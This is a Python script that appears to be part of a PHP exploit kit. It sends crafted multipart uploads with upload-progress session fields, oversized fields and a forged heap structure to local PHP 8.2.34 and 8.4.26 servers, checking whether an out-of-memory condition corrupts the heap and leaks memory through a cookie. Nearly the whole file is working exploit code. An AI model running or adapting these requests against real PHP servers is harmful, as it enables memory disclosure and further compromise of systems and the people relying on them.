"""Verify per-field limit: does a large 'big' field OOM (stored) or drop (limit)?
Compare 8.2.34 vs 8.4.26. Signal: leak-request cookie length.
  cookie > 100B  -> OOM fired (field stored, heap corrupted) -> leak
  cookie ~32B    -> no OOM (field dropped) -> no leak
"""
import sys, os, time, struct
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import exploit as E

def trial(port, label, mb, n=841):
    URL = f"http://127.0.0.1:{port}/"
    t = E.Target(URL, timeout=90.0, verbose=False)
    parts = [{"name": f"p{i:04d}", "data": b"x"} for i in range(1001)]
    parts += [
        {"name": "PHPSESSID", "data": b"\x00"},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        {"name": "f", "filename": "a.txt", "data": b"A" * 64},
        {"name": "big", "data": b"B" * (mb * 1024 * 1024)},
    ]
    try:
        r1 = t.post(E.build_multipart(parts, b"S" * 17), b"S" * 17, read_cap=1 << 20, timeout=90.0)
    except Exception:
        r1 = b""
    time.sleep(0.3)
    parts = [
        {"name": "PHPSESSID", "data": E.SID},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
    ]
    for i in range(n):
        val = (f"v{i:04d}" + "x" * 44)[:48]
        parts.append({"name": str(1000 + i), "data": val.encode()})
    forge = bytearray(b"A" * 79)
    struct.pack_into("<Q", forge, 0x10, 0x1000)
    forge[0x18] = ord("L")
    parts.append({"name": "1999", "data": bytes(forge)})
    try:
        r2 = t.post(E.build_multipart(parts, b"B" * 10), b"B" * 10, read_cap=9 << 20, timeout=90.0)
    except Exception:
        r2 = b""
    raw = E.parse_cookie(r2)
    oom = len(raw) > 100
    print(f"  {label} big={mb}MB: cookie={len(raw)}B {'*** OOM/LEAK ***' if oom else '(no OOM)'}", flush=True)
    return oom

for mb in [2, 4, 8, 12]:
    trial(18111, "8.2.34", mb)
    time.sleep(0.3)
    trial(18113, "8.4.26", mb)
    time.sleep(0.3)
print("=== done ===", flush=True)
